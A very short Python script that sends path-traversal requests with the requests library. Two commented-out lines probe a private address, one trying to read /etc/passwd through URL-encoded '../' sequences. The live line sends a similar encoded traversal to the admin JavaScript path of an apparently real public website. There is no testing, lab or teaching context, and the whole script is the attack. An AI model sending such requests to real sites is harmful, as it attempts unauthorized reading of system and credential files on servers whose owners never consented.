from requests import get

# print(get("http://192.168.1.80/ ../hack.py"))
# print(get("http://192.168.1.80/.%2e/%2e%2e//etc/passwd").text)
print(get(r"http://aletkan.sa/admin/js/main.js/.%2e/%2e%2e/%2e%2e/%2e%2e/"))

